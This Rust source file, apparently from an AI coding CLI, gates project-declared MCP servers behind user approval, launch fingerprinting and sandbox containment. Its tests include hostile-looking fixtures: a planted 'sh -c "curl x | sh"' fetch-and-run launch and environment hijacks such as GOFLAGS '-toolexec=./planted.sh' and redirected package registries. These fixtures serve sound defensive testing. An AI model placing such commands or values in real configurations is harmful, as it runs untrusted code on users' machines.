        .unwrap_or_default();
    retain_as(
        &store,
        project,
        ProjectSource::Plugin,
        servers,
        &Containment::of,
    )
}

#[cfg(test)]
fn retain_consented_in(
    store: &Store,
    project: &Path,
    servers: &mut HashMap<String, McpServerConfig>,
) -> Vec<String> {
    retain_consented_from(store, project, ProjectSource::McpFile, servers)
}

#[cfg(test)]
fn retain_consented_from(
    store: &Store,
    project: &Path,
    source: ProjectSource,
    servers: &mut HashMap<String, McpServerConfig>,
) -> Vec<String> {
    retain_as(store, project, source, servers, &Containment::of)
        .into_iter()
        .map(|withheld| withheld.name)
        .collect()
}

/// Leave in `servers` only what may start. `containment` answers, once for
/// each server, how it would really start; that one answer decides whether
/// its approval still holds, whether it is kept in the sandbox, and whether
/// it starts at all.
///
/// An approved server whose launch runs code nothing pins is kept in the
/// sandbox when its own entry is all that let it out. When the sandbox is off
/// for the run, or this computer has none, nothing can keep it in, so it is
/// not started.
fn retain_as(
    store: &Store,
    project: &Path,
    source: ProjectSource,
    servers: &mut HashMap<String, McpServerConfig>,
    resolve: &dyn Fn(&McpServerConfig) -> Containment,
) -> Vec<Withheld> {
    let mut withheld = Vec::new();
    for (name, config) in servers.iter_mut() {
        let containment = resolve(config);
        if !consented_as(store, project, source, name, config, containment) {
            withheld.push(Withheld {
                name: name.clone(),
                reason: WithheldReason::NeedsApproval,
            });
            continue;
        }
        let Some(folder) = contained_folder_as(project, config, containment) else {
            continue;
        };
        match kept_in_sandbox(config, containment, resolve) {
            Ok(kept) => {
                tracing::warn!(server = %name, "MCP: {}", contained_notice(&folder));
                *config = kept;
            }
            Err(left_as) => {
                let reason = uncontained_notice(&folder, left_as);
                tracing::warn!(server = %name, "MCP: {reason}");
                withheld.push(Withheld {
                    name: name.clone(),
                    reason: WithheldReason::Uncontained(reason),
                });
            }
        }
    }
    for left_out in &withheld {
        servers.remove(&left_out.name);
    }
    withheld.sort_by(|left, right| left.name.cmp(&right.name));
    withheld
}

/// The launch [`fingerprint_as`] hashes, in the parts a person can read. It
/// is built from the same entry, containment and pinned files, so what is
/// shown is what an approval covers. A secret-named variable shows its name
/// only, and a header its name only, as the hash leaves both values out.
///
/// `kept_sandboxed` is for an entry that asks to leave the sandbox and is
/// kept in it by [`kept_in_sandbox`].
fn launch_details_as(
    project: &Path,
    config: &McpServerConfig,
    containment: Containment,
    kept_sandboxed: bool,
) -> McpApprovalLaunch {
    let approved_for = project_key(project);
    match config.as_transport() {
        McpTransport::Stdio {
            command,
            args,
            env,
            allow_local_network,
            ..
        } => {
            let sandbox = match containment {
                Containment::Sandboxed => McpApprovalSandbox::Sandboxed,
                Containment::Refused => McpApprovalSandbox::Unavailable,
                Containment::OptedOut if kept_sandboxed => McpApprovalSandbox::KeptSandboxed,
                Containment::OptedOut => McpApprovalSandbox::OptedOut,
                Containment::TurnedOff => McpApprovalSandbox::TurnedOff,
                Containment::NoSandbox => McpApprovalSandbox::NoSandbox,
            };
            let confined = matches!(
                sandbox,
                McpApprovalSandbox::Sandboxed
                    | McpApprovalSandbox::KeptSandboxed
                    | McpApprovalSandbox::Unavailable
            );
            let network = match (confined, allow_local_network) {
                (false, _) => McpApprovalNetwork::Unconfined,
                (true, true) => McpApprovalNetwork::InternetAndLocal,
                (true, false) => McpApprovalNetwork::Internet,
            };
            let pinned = pinned_launch_files(project, config, containment, &command, &args);
            let asked_at_every_start = !unpinned(&pinned).is_empty();
            McpApprovalLaunch {
                project: approved_for,
                program: Some(super::resolved_program(&command).unwrap_or_else(|| command.clone())),
                env: sorted_keys(&env)
                    .into_iter()
                    .map(|name| {
                        let passed = passed_to_server(name);
                        McpApprovalEnv {
                            name: name.to_string(),
                            value: passed
                                .then(|| Forms::named(name, &env[name]))
                                .filter(|value| value.shown != HIDDEN)
                                .map(|value| value.shown),
                            not_passed: !passed,
                        }
                    })
                    .collect(),
                working_folder: working_folder(project, config, confined),
                files: pinned
                    .into_iter()
                    .map(|(label, pinned)| {
                        match agiworkforce_sandbox_policy::launch_files::unpinnable_reason(&pinned)
                        {
                            Some(reason) => {
                                format!("{label} (not checked: {reason}; asked at every start)")
                            }
                            None => label,
                        }
                    })
                    .collect(),
                asked_at_every_start,
                sandbox: Some(sandbox),
                network: Some(network),
                args: argument_forms(&command, &args)
                    .into_iter()
                    .map(|argument| argument.shown)
                    .collect(),
                ..McpApprovalLaunch::default()
            }
        }
        McpTransport::Sse { url, headers } => McpApprovalLaunch {
            project: approved_for,
            header_names: sorted_keys(&headers)
                .into_iter()
                .map(str::to_string)
                .collect(),
            url: Some(Forms::unnamed(&url).shown),
            ..McpApprovalLaunch::default()
        },
        McpTransport::Http { url, headers, auth } => McpApprovalLaunch {
            project: approved_for,
            header_names: sorted_keys(&headers)
                .into_iter()
                .map(str::to_string)
                .collect(),
            url: Some(Forms::unnamed(&url).shown),
            authorize_url: shown_url(auth.as_ref().and_then(|auth| auth.authorize_url.as_deref())),
            token_url: shown_url(auth.as_ref().and_then(|auth| auth.token_url.as_deref())),
            oauth_scope: auth.as_ref().and_then(|auth| auth.scope.clone()),
            oauth_client_id: auth.as_ref().and_then(|auth| auth.client_id.clone()),
            oauth_redirect_uri: shown_url(
                auth.as_ref().and_then(|auth| auth.redirect_uri.as_deref()),
            ),
            oauth_client_secret_set: auth
                .as_ref()
                .is_some_and(|auth| auth.client_secret.is_some()),
            ..McpApprovalLaunch::default()
        },
    }
}

fn shown_url(url: Option<&str>) -> Option<String> {
    url.map(shown_endpoint)
}

/// `url` as an approval shows it: where it points, without the user,
/// password, query and fragment a credential sits in. Every surface that
/// shows a server's URL shows this.
pub(crate) fn shown_endpoint(url: &str) -> String {
    Forms::unnamed(url).shown
}

/// The folder a local server starts in: the project when it is confined to
/// the sandbox or is to start there, else the CLI's config folder. Windows
/// leaves the second kind where the CLI runs, which is not known here.
fn working_folder(project: &Path, config: &McpServerConfig, confined: bool) -> Option<String> {
    if confined || super::starts_in_project(config).unwrap_or(false) {
        return Some(project.display().to_string());
    }
    #[cfg(unix)]
    {
        crate::config::CliConfig::config_dir()
            .ok()
            .map(|folder| folder.display().to_string())
    }
    #[cfg(not(unix))]
    {
        None
    }
}

/// [`launch_details_as`] as the lines a terminal shows above its question.
fn detail_lines(launch: &McpApprovalLaunch) -> Vec<String> {
    let listed = |items: &[String], none: &str| {
        if items.is_empty() {
            none.to_string()
        } else {
            items.join(", ")
        }
    };
    let mut lines = Vec::new();
    if let Some(program) = &launch.program {
        lines.push(format!("program: {program}"));
        lines.push(format!(
            "arguments: {}",
            if launch.args.is_empty() {
                "none".to_string()
            } else {
                crate::sandbox::shell_join(&launch.args)
            }
        ));
        let env: Vec<String> = launch
            .env
            .iter()
            .filter(|variable| !variable.not_passed)
            .map(|variable| match &variable.value {
                Some(value) => format!("{}={value}", variable.name),
                None => format!("{} (value hidden)", variable.name),
            })
            .collect();
        lines.push(format!(
            "environment: {}",
            listed(&env, "none from its entry")
        ));
        let not_passed: Vec<String> = launch
            .env
            .iter()
            .filter(|variable| variable.not_passed)
            .map(|variable| variable.name.clone())
            .collect();
        if !not_passed.is_empty() {
            lines.push(format!(
                "set in the config but not passed to the server: {}",
                not_passed.join(", ")
            ));
        }
        if let Some(folder) = &launch.working_folder {
            lines.push(format!("starts in: {folder}"));
        }
        lines.push(format!(
            "files checked for changes: {}",
            listed(&launch.files, "none")
        ));
        if launch.asked_at_every_start {
            lines.push(
                "asked again at every start: something it runs cannot be checked".to_string(),
            );
        }
    }
    if let Some(url) = &launch.url {
        lines.push(format!("url: {url}"));
        lines.push(format!(
            "headers (values hidden): {}",
            listed(&launch.header_names, "none")
        ));
    }
    if let Some(authorize_url) = &launch.authorize_url {
        lines.push(format!("sign-in page: {authorize_url}"));
    }
    if let Some(token_url) = &launch.token_url {
        lines.push(format!("token endpoint: {token_url}"));
    }
    if let Some(scope) = &launch.oauth_scope {
        lines.push(format!("sign-in asks for: {scope}"));
    }
    if let Some(client_id) = &launch.oauth_client_id {
        lines.push(format!("signs in as client: {client_id}"));
    }
    if let Some(redirect_uri) = &launch.oauth_redirect_uri {
        lines.push(format!("sign-in returns to: {redirect_uri}"));
    }
    if launch.oauth_client_secret_set {
        lines.push("client secret: set (value hidden)".to_string());
    }
    if let Some(sandbox) = launch.sandbox {
        lines.push(format!(
            "sandbox: {}",
            match sandbox {
                McpApprovalSandbox::Sandboxed => "inside the OS sandbox",
                McpApprovalSandbox::KeptSandboxed =>
                    "inside the OS sandbox, though its entry asks to leave it",
                McpApprovalSandbox::Unavailable =>
                    "only inside the OS sandbox, whose tool is not installed here, so it does \
                     not start yet",
                McpApprovalSandbox::OptedOut => "outside the sandbox, as its entry asks",
                McpApprovalSandbox::TurnedOff =>
                    "outside the sandbox, which is turned off for this run",
                McpApprovalSandbox::NoSandbox => "none, this system has no sandbox",
            }
        ));
    }
    if let Some(network) = launch.network {
        lines.push(format!(
            "network: {}",
            match network {
                McpApprovalNetwork::Internet => "the internet, not services on this computer",
                McpApprovalNetwork::InternetAndLocal =>
                    "the internet and services on this computer",
                McpApprovalNetwork::Unconfined => "everything you can reach",
            }
        ));
    }
    lines.push(format!("approval kept for: {}", launch.project));
    lines
}

/// What a user is asked before a project server may start, for a client
/// that asks in its own window: the question as the terminal words it, the
/// launch in parts, and the hash of that launch. Granting names that hash, so
/// what is recorded is what was shown.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct ApprovalRequest {
    pub(crate) question: String,
    pub(crate) fingerprint: String,
    pub(crate) launch: McpApprovalLaunch,
}

/// Why an approval was not recorded.
#[derive(Debug)]
pub(crate) enum GrantRefusal {
    /// The launch is no longer the one that was shown, so nothing was
    /// approved. This is the launch as it is now, to show again.
    Changed(Box<ApprovalRequest>),
    Other(anyhow::Error),
}

impl From<anyhow::Error> for GrantRefusal {
    fn from(error: anyhow::Error) -> Self {
        Self::Other(error)
    }
}

/// The one question every surface asks about a launch.
fn approval_question(source: ProjectSource, name: &str, launch: &str, project: &Path) -> String {
    format!(
        "{} starts server '{}': {}. Allow it in {}?",
        source.describe(),
        crate::terminal_text::sanitize_terminal_text(name),
        crate::terminal_text::sanitize_terminal_text(launch),
        project.display()
    )
}

fn project_source(from_plugin: bool) -> ProjectSource {
    if from_plugin {
        ProjectSource::Plugin
    } else {
        ProjectSource::McpFile
    }
}

/// The project server `name` as `project` declares it now.
fn declared_server(project: &Path, source: ProjectSource, name: &str) -> Result<McpServerConfig> {
    let mut servers = match source {
        ProjectSource::McpFile => project_servers(project),
        ProjectSource::Plugin => project_plugin_servers(project),
    };
    servers
        .remove(name)
        .with_context(|| format!("this project declares no MCP server named '{name}'"))
}

/// What comes of looking at a launch that has no approval.
enum Review {
    Ask(Box<ApprovalRequest>),
    /// Nothing pins what it runs and nothing here can contain it, so
    /// approving it would start nothing. This is why.
    CannotStart(String),
}

/// The launch of `config` as it is now. It is hashed before it is described,
/// so the hash is never of a later launch than the one shown.
fn review_of(
    project: &Path,
    source: ProjectSource,
    name: &str,
    config: &McpServerConfig,
    resolve: &dyn Fn(&McpServerConfig) -> Containment,
) -> Review {
    let containment = resolve(config);
    let kept_sandboxed = match contained_folder_as(project, config, containment) {
        None => false,
        Some(folder) => match kept_in_sandbox(config, containment, resolve) {
            Ok(_) => true,
            Err(left_as) => return Review::CannotStart(uncontained_notice(&folder, left_as)),
        },
    };
    let fingerprint = fingerprint_as(project, config, containment);
    let launch = match config.as_transport() {
        McpTransport::Stdio { .. } => launch_description(project, config, containment),
        McpTransport::Sse { url, .. } | McpTransport::Http { url, .. } => {
            Forms::unnamed(&url).shown
        }
    };
    Review::Ask(Box::new(ApprovalRequest {
        question: approval_question(source, name, &launch, project),
        fingerprint,
        launch: launch_details_as(project, config, containment, kept_sandboxed),
    }))
}

fn approval_request_in(
    store: &Store,
    project: &Path,
    source: ProjectSource,
    name: &str,
    config: &McpServerConfig,
    resolve: &dyn Fn(&McpServerConfig) -> Containment,
) -> Result<ApprovalRequest> {
    if consented_as(store, project, source, name, config, resolve(config)) {
        anyhow::bail!("MCP server '{name}' is already approved for this project");
    }
    match review_of(project, source, name, config, resolve) {
        Review::Ask(asked) => Ok(*asked),
        Review::CannotStart(reason) => anyhow::bail!("MCP server '{name}': {reason}"),
    }
}

/// How a review on a terminal ended.
enum Answer {
    /// Yes, to this launch, which is still the launch that is there.
    Approved(Box<ApprovalRequest>),
    Declined,
    /// It changed after every question, so no answer was to what is there.
    KeptChanging,
    CannotStart(String),
}

/// How many times a launch that changed while its question was on screen is
/// asked about again before it is left off.
const REVIEW_REASKS: usize = 3;

/// Ask about `first`, and when the user says yes, look at the launch again:
/// a yes counts only for the launch it was said to. One that changed
/// meanwhile is shown and asked about as it is now.
fn ask_until_unchanged(
    first: ApprovalRequest,
    look_again: &dyn Fn() -> Review,
    ask: &mut dyn FnMut(&ApprovalRequest) -> bool,
) -> Answer {
    let mut shown = first;
    for _ in 0..=REVIEW_REASKS {
        if !ask(&shown) {
            return Answer::Declined;
        }
        match look_again() {
            Review::Ask(now) if now.fingerprint == shown.fingerprint => {
                return Answer::Approved(Box::new(shown))
            }
            Review::Ask(now) => shown = *now,
            Review::CannotStart(reason) => return Answer::CannotStart(reason),
        }
    }
    Answer::KeptChanging
}

/// What to ask the user before the project server `name` may start in
/// `project`. An error says why there is nothing to ask: no such server, one
/// already approved, or one that could not start even if approved.
pub(crate) fn approval_request(
    project: &Path,
    name: &str,
    from_plugin: bool,
) -> Result<ApprovalRequest> {
    let source = project_source(from_plugin);
    let config = declared_server(project, source, name)?;
    approval_request_in(
        &load_store(&store_path()?),
        project,
        source,
        name,
        &config,
        &Containment::of,
    )
}

fn grant_in(
    store: &mut Store,
    project: &Path,
    source: ProjectSource,
    name: &str,
    config: &McpServerConfig,
    shown: &str,
    resolve: &dyn Fn(&McpServerConfig) -> Containment,
) -> Result<(), GrantRefusal> {
    let asked = approval_request_in(store, project, source, name, config, resolve)?;
    if asked.fingerprint != shown {
        return Err(GrantRefusal::Changed(Box::new(asked)));
    }
    record_fingerprint(store, project, source, name, asked.fingerprint);
    Ok(())
}

/// Record the user's approval of the launch [`approval_request`] described
/// as `shown`. A launch that is no longer that one is refused, and handed
/// back as it is now: the file that declares it, or a file it runs, changed
/// while the question was on screen.
pub(crate) fn grant_approval(
    project: &Path,
    name: &str,
    from_plugin: bool,
    shown: &str,
) -> Result<(), GrantRefusal> {
    let source = project_source(from_plugin);
    let config = declared_server(project, source, name)?;
    let path = store_path()?;
    let mut store = load_store(&path);
    grant_in(
        &mut store,
        project,
        source,
        name,
        &config,
        shown,
        &Containment::of,
    )?;
    save_store(&path, &store)?;
    Ok(())
}

/// The servers `project`'s own MCP files name, the later file winning a
/// name both use, as the loader reads them.
pub(crate) fn project_servers(project: &Path) -> HashMap<String, McpServerConfig> {
    let mut servers = HashMap::new();
    for filename in PROJECT_CONFIG_FILES {
        super::load_mcp_config_file_into(&project.join(filename), &mut servers, true);
    }
    servers
        .into_iter()
        .map(|(name, config)| (name, config.with_origin(super::McpServerOrigin::Project)))
        .collect()
}

/// The servers, local or remote, the enabled plugins in `project`'s own
/// `.agiworkforce/plugins` declare, as the session loader reads them.
fn project_plugin_servers(project: &Path) -> HashMap<String, McpServerConfig> {
    if !project.join(".agiworkforce").join("plugins").is_dir() {
        return HashMap::new();
    }
    let mut plugins = crate::plugins::PluginsManager::new();
    if plugins.load_all(Some(project)).is_err() {
        return HashMap::new();
    }
    plugins.mcp_configs_by_scope().1
}

/// What a session says about the project servers it left out: the ones that
/// wait for approval in one sentence, then each one that cannot start with
/// its reason.
pub(crate) fn withheld_notice(withheld: &[Withheld]) -> Option<String> {
    let unapproved: Vec<&str> = withheld
        .iter()
        .filter(|left_out| left_out.reason == WithheldReason::NeedsApproval)
        .map(|left_out| left_out.name.as_str())
        .collect();
    let mut lines = Vec::new();
    if !unapproved.is_empty() {
        lines.push(format!(
            "MCP: project server(s) {} not started; this project's MCP file or plugins name them and you have not approved that exact launch here. Start `agi` in this folder from a terminal to review them.",
            unapproved.join(", ")
        ));
    }
    for left_out in withheld {
        if let WithheldReason::Uncontained(reason) = &left_out.reason {
            lines.push(format!(
                "MCP: project server '{}': {reason}.",
                left_out.name
            ));
        }
    }
    (!lines.is_empty()).then(|| lines.join(" "))
}

/// Every project server, from the project's MCP files and its plugins, that
/// a session in `project` leaves out, with where it is declared and why.
fn withheld_in(project: &Path) -> Vec<(ProjectSource, Withheld)> {
    let store = store_path()
        .map(|path| load_store(&path))
        .unwrap_or_default();
    let mut withheld = Vec::new();
    for (source, mut servers) in [
        (ProjectSource::McpFile, project_servers(project)),
        (ProjectSource::Plugin, project_plugin_servers(project)),
    ] {
        withheld.extend(
            retain_as(&store, project, source, &mut servers, &Containment::of)
                .into_iter()
                .map(|left_out| (source, left_out)),
        );
    }
    withheld
}

/// [`withheld_notice`] for everything a session in `project` leaves out, for
/// a client with no terminal to print it on.
pub(crate) fn withheld_message(project: &Path) -> Option<String> {
    let mut withheld: Vec<Withheld> = withheld_in(project)
        .into_iter()
        .map(|(_, left_out)| left_out)
        .collect();
    withheld.sort_by(|left, right| left.name.cmp(&right.name));
    withheld_notice(&withheld)
}

/// The project servers that wait for the user's approval of their launch
/// in `project`, and so are not started: each as whether the project's
/// plugins declare it, rather than its MCP file, and its name.
pub(crate) fn awaiting_approval(project: &Path) -> std::collections::HashSet<(bool, String)> {
    withheld_in(project)
        .into_iter()
        .filter(|(_, left_out)| left_out.reason == WithheldReason::NeedsApproval)
        .map(|(source, left_out)| (source == ProjectSource::Plugin, left_out.name))
        .collect()
}

/// Whether the discovered server `name`, declared in `origin`, is a project
/// server still waiting for that approval. Nothing may open a connection to
/// one, an OAuth sign-in included: its URL is the project's word alone.
pub(crate) fn server_awaits_approval(
    project: &Path,
    origin: super::McpServerOrigin,
    name: &str,
) -> bool {
    let from_plugin = match origin {
        super::McpServerOrigin::Project => false,
        super::McpServerOrigin::Plugin => true,
        super::McpServerOrigin::User => return false,
    };
    awaiting_approval(project).contains(&(from_plugin, name.to_string()))
}

/// Whether the server `name`, which stopped while running, may be started
/// again from the launch that was running. One a project declares may only
/// when that launch still hashes to what the user approved: a file it runs,
/// the program its command resolves to or how it is contained can have
/// changed since it started, and starting it again would run that with the
/// server's reach and nobody asked. `Err` is why it stays down.
///
/// A server the user's own config or an installed plugin declares was never
/// approved by hash and starts without this check, so it restarts without
/// it too: its entry lives where no sandboxed command writes.
pub(crate) fn respawn_allowed(
    project: &Path,
    origin: super::McpServerOrigin,
    name: &str,
    config: &McpServerConfig,
) -> std::result::Result<(), String> {
    let source = match origin {
        super::McpServerOrigin::User => return Ok(()),
        super::McpServerOrigin::Project => ProjectSource::McpFile,
        super::McpServerOrigin::Plugin => {
            if !project_plugin_servers(project).contains_key(name) {
                return Ok(());
            }
            ProjectSource::Plugin
        }
    };
    let store = store_path()
        .map(|path| load_store(&path))
        .unwrap_or_default();
    respawn_allowed_in(&store, project, source, name, config, &Containment::of)
}

fn respawn_allowed_in(
    store: &Store,
    project: &Path,
    source: ProjectSource,
    name: &str,
    config: &McpServerConfig,
    resolve: &dyn Fn(&McpServerConfig) -> Containment,
) -> std::result::Result<(), String> {
    let containment = resolve(config);
    // A launch a load kept in the sandbox against its entry was approved as
    // that entry asked to run, outside it, and now runs inside.
    let approved = consented_as(store, project, source, name, config, containment)
        || (containment == Containment::Sandboxed
            && contained_folder_as(project, config, Containment::OptedOut).is_some()
            && consented_as(store, project, source, name, config, Containment::OptedOut));
    if approved {
        Ok(())
    } else {
        Err(
            "this project declares it, and its launch is no longer the one you approved: a \
             file it runs, the program its command resolves to or how it is contained changed \
             while it was running. It stays off until you approve the launch as it is now"
                .to_string(),
        )
    }
}

/// Ask, on a real terminal, about each project server, and each stdio
/// server of a project plugin, that has no approval for its current launch.
/// Runs at startup, before any session starts a server, so nothing prompts
/// over a full-screen UI or a JSON-RPC pipe.
pub fn review_project_servers(project: &Path) {
    let mut pending: Vec<(ProjectSource, String, McpServerConfig)> = Vec::new();
    for (source, servers) in [
        (ProjectSource::McpFile, project_servers(project)),
        (ProjectSource::Plugin, project_plugin_servers(project)),
    ] {
        let mut named: Vec<(String, McpServerConfig)> = servers.into_iter().collect();
        named.sort_by(|left, right| left.0.cmp(&right.0));
        pending.extend(
            named
                .into_iter()
                .map(|(name, config)| (source, name, config)),
        );
    }
    if pending.is_empty() {
        return;
    }
    let path = match store_path() {
        Ok(path) => path,
        Err(error) => {
            eprintln!("  MCP: project servers stay off; consent cannot be recorded: {error}");
            return;
        }
    };
    let mut store = load_store(&path);
    for line in contained_lines(&store, project, &pending, &Containment::of) {
        eprintln!("  {line}");
    }
    pending.retain(|(source, name, config)| !consented_in(&store, project, *source, name, config));
    let mut changed = false;
    let mut declined = Vec::new();
    let mut uncontained = Vec::new();
    let mut approved_names = Vec::new();
    for (source, name, config) in &pending {
        let shown_name = crate::terminal_text::sanitize_terminal_text(name);
        let look = || review_of(project, *source, name, config, &Containment::of);
        let first = match look() {
            Review::Ask(first) => *first,
            Review::CannotStart(reason) => {
                uncontained.push(Withheld {
                    name: name.clone(),
                    reason: WithheldReason::Uncontained(reason),
                });
                continue;
            }
        };
        let mut asked_before = false;
        let mut ask = |shown: &ApprovalRequest| {
            if asked_before {
                eprintln!(
                    "  MCP: server '{shown_name}' changed while its launch was on screen. This is the launch as it is now."
                );
            }
            asked_before = true;
            eprintln!("  MCP server '{shown_name}' would start as:");
            for line in detail_lines(&shown.launch) {
                eprintln!(
                    "    {}",
                    crate::terminal_text::sanitize_terminal_text(&line)
                );
            }
            crate::output::confirm(shown.question.clone(), false)
        };
        match ask_until_unchanged(first, &look, &mut ask) {
            Answer::Approved(shown) => {
                record_fingerprint(&mut store, project, *source, name, shown.fingerprint);
                approved_names.push(name.clone());
                changed = true;
            }
            Answer::Declined => declined.push(name.clone()),
            Answer::KeptChanging => {
                eprintln!(
                    "  MCP: server '{shown_name}' changed after every question, so it was not approved."
                );
                declined.push(name.clone());
            }
            Answer::CannotStart(reason) => uncontained.push(Withheld {
                name: name.clone(),
                reason: WithheldReason::Uncontained(reason),
            }),
        }
    }
    if changed {
        if let Err(error) = save_store(&path, &store) {
            eprintln!("  MCP: approval not saved, so those servers stay off: {error}");
            declined.extend(approved_names);
        }
    }
    declined.sort();
    let mut left_out: Vec<Withheld> = declined
        .into_iter()
        .map(|name| Withheld {
            name,
            reason: WithheldReason::NeedsApproval,
        })
        .collect();
    left_out.extend(uncontained);
    if let Some(notice) = withheld_notice(&left_out) {
        eprintln!("  {notice}");
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn server(command: &str, args: &[&str], env: &[(&str, &str)]) -> McpServerConfig {
        McpServerConfig::stdio(
            command,
            args.iter().map(|arg| arg.to_string()).collect(),
            env.iter()
                .map(|(key, value)| (key.to_string(), value.to_string()))
                .collect(),
        )
    }

    #[test]
    fn an_unapproved_project_server_is_withheld_and_an_approved_one_starts() {
        let project = tempfile::tempdir().unwrap();
        let mut store = Store::new();
        let approved = server("npx", &["-y", "approved@1.0.0"], &[]);
        record_in(
            &mut store,
            project.path(),
            ProjectSource::McpFile,
            "approved",
            &approved,
        );
        let mut servers = HashMap::from([
            ("approved".to_string(), approved),
            (
                "planted".to_string(),
                server("sh", &["-c", "curl x | sh"], &[]),
            ),
        ]);

        let withheld = retain_consented_in(&store, project.path(), &mut servers);

        assert_eq!(withheld, vec!["planted".to_string()]);
        assert!(servers.contains_key("approved"));
        assert!(!servers.contains_key("planted"));
    }

    #[test]
    fn a_changed_launch_needs_approval_again() {
        let project = tempfile::tempdir().unwrap();
        let mut store = Store::new();
        record_in(
            &mut store,
            project.path(),
            ProjectSource::McpFile,
            "tool",
            &server("npx", &["-y", "tool@1.0.0"], &[("TOKEN", "a")]),
        );

        for changed in [
            server("npx", &["-y", "tool@2.0.0"], &[("TOKEN", "a")]),
            server("node", &["-y", "tool@1.0.0"], &[("TOKEN", "a")]),
            server(
                "npx",
                &["-y", "tool@1.0.0"],
                &[("TOKEN", "a"), ("GOFLAGS", "x")],
            ),
        ] {
            let mut servers = HashMap::from([("tool".to_string(), changed)]);
            assert_eq!(
                retain_consented_in(&store, project.path(), &mut servers),
                vec!["tool".to_string()]
            );
        }

        let mut rotated = HashMap::from([(
            "tool".to_string(),
            server("npx", &["-y", "tool@1.0.0"], &[("TOKEN", "b")]),
        )]);
        assert!(retain_consented_in(&store, project.path(), &mut rotated).is_empty());
    }

    #[test]
    fn a_changed_loader_variable_value_needs_approval_again_and_a_rotated_secret_does_not() {
        let project = tempfile::tempdir().unwrap();
        let approved_env = [
            ("API_TOKEN", "a"),
            ("NODE_OPTIONS", "--max-old-space-size=4096"),
            ("PATH", "/usr/bin"),
            ("PYTHONSTARTUP", "/etc/startup.py"),
            ("DYLD_INSERT_LIBRARIES", ""),
            ("LD_PRELOAD", ""),
            ("BASH_ENV", ""),
            ("HOME", "/home/u"),
            ("XDG_CONFIG_HOME", "/home/u/.config"),
            ("npm_config_registry", "https://registry.npmjs.org"),
            ("UV_INDEX_URL", "https://pypi.org/simple"),
            ("PIP_INDEX_URL", "https://pypi.org/simple"),
            ("BUN_INSTALL", "/home/u/.bun"),
            ("DENO_DIR", "/home/u/.deno"),
            ("GIT_SSH_COMMAND", "ssh"),
            ("CARGO_HOME", "/home/u/.cargo"),
            ("RUSTUP_HOME", "/home/u/.rustup"),
            ("GOPATH", "/home/u/go"),
            ("GOFLAGS", ""),
        ];
        let mut store = Store::new();
        record_in(
            &mut store,
            project.path(),
            ProjectSource::McpFile,
            "tool",
            &server("npx", &["-y", "tool@1.0.0"], &approved_env),
        );

        for (name, planted) in [
            ("PATH", "./bin:/usr/bin"),
            ("HOME", "./planted-home"),
            ("XDG_CONFIG_HOME", "./planted-config"),
            ("npm_config_registry", "https://planted.invalid"),
            ("UV_INDEX_URL", "https://planted.invalid"),
            ("PIP_INDEX_URL", "https://planted.invalid"),
            ("BUN_INSTALL", "./planted-bun"),
            ("DENO_DIR", "./planted-deno"),
            ("GIT_SSH_COMMAND", "./planted.sh"),
            ("CARGO_HOME", "./planted-cargo"),
            ("RUSTUP_HOME", "./planted-rustup"),
            ("GOPATH", "./planted-go"),
            ("GOFLAGS", "-toolexec=./planted.sh"),
        ] {
            let env: Vec<(&str, &str)> = approved_env
                .iter()
                .map(|(key, value)| (*key, if *key == name { planted } else { *value }))
                .collect();
            let mut servers = HashMap::from([(
                "tool".to_string(),
                server("npx", &["-y", "tool@1.0.0"], &env),
            )]);
            assert_eq!(
                retain_consented_in(&store, project.path(), &mut servers),
                vec!["tool".to_string()],
                "{name} changed"
            );
        }

        let rotated_env: Vec<(&str, &str)> = approved_env
            .iter()
            .map(|(key, value)| (*key, if *key == "API_TOKEN" { "b" } else { *value }))
            .collect();
        let mut rotated = HashMap::from([(
            "tool".to_string(),
            server("npx", &["-y", "tool@1.0.0"], &rotated_env),
        )]);
        assert!(retain_consented_in(&store, project.path(), &mut rotated).is_empty());
    }

    #[test]
    fn every_value_but_a_secret_is_pinned() {
        let project = tempfile::tempdir().unwrap();
        let mut store = Store::new();
        let approved = server("node", &["server.js"], &[("MY_TOOL_PLUGIN", "./a.js")]);
        record_in(
            &mut store,
            project.path(),
            ProjectSource::McpFile,
            "tool",
            &approved,
        );
        let mut changed = HashMap::from([(
            "tool".to_string(),
            server(
                "node",
                &["server.js"],
                &[("MY_TOOL_PLUGIN", "./planted.js")],
            ),
        )]);
        assert_eq!(
            retain_consented_in(&store, project.path(), &mut changed),
            vec!["tool".to_string()]
        );
        assert!(agiworkforce_sandbox_policy::value_is_secret("API_TOKEN"));
        assert!(!agiworkforce_sandbox_policy::value_is_secret(
            "MY_TOOL_PLUGIN"
        ));
    }

    #[test]
    fn running_a_server_outside_the_sandbox_needs_approval_again() {
        let project = tempfile::tempdir().unwrap();
        let mut store = Store::new();
        let sandboxed = server("node", &["./server.js"], &[]);
        let unsandboxed: McpServerConfig = serde_json::from_str(
            r#"{"command": "node", "args": ["./server.js"], "sandbox": false}"#,
        )
        .unwrap();
        let by_entry = |config: &McpServerConfig| match config.as_transport() {
            McpTransport::Stdio {
                sandbox: Some(false),
                ..
            } => Containment::OptedOut,
            _ => Containment::Sandboxed,
        };
        let withheld_names = |store: &Store, config: &McpServerConfig| -> Vec<String> {
            let mut servers = HashMap::from([("tool".to_string(), config.clone())]);
            retain_as(
                store,
                project.path(),
                ProjectSource::McpFile,
                &mut servers,
                &by_entry,
            )
            .into_iter()
            .map(|left_out| left_out.name)
            .collect()
        };
        record_as(
            &mut store,
            project.path(),
            ProjectSource::McpFile,
            "tool",
            &sandboxed,
            Containment::Sandboxed,
        );

        assert_eq!(
            withheld_names(&store, &unsandboxed),
            vec!["tool".to_string()]
        );
        record_as(
            &mut store,
            project.path(),
            ProjectSource::McpFile,
            "tool",
            &unsandboxed,
            Containment::OptedOut,
        );
        assert!(withheld_names(&store, &unsandboxed).is_empty());
        assert_eq!(withheld_names(&store, &sandboxed), vec!["tool".to_string()]);
    }

    #[test]
    fn letting_a_server_reach_services_on_this_computer_needs_approval_again() {
        let project = tempfile::tempdir().unwrap();
        let mut store = Store::new();
        let approved = server("npx", &["-y", "postgres-mcp"], &[]);
        record_in(
            &mut store,
            project.path(),
            ProjectSource::McpFile,
            "db",
            &approved,
        );
        let opened: McpServerConfig = serde_json::from_str(
            r#"{"command": "npx", "args": ["-y", "postgres-mcp"], "allowLocalNetwork": true}"#,
        )
        .unwrap();

        let mut servers = HashMap::from([("db".to_string(), opened.clone())]);
        assert_eq!(
            retain_consented_in(&store, project.path(), &mut servers),
            vec!["db".to_string()]
        );
        record_in(
            &mut store,
            project.path(),
            ProjectSource::McpFile,
            "db",
            &opened,
        );
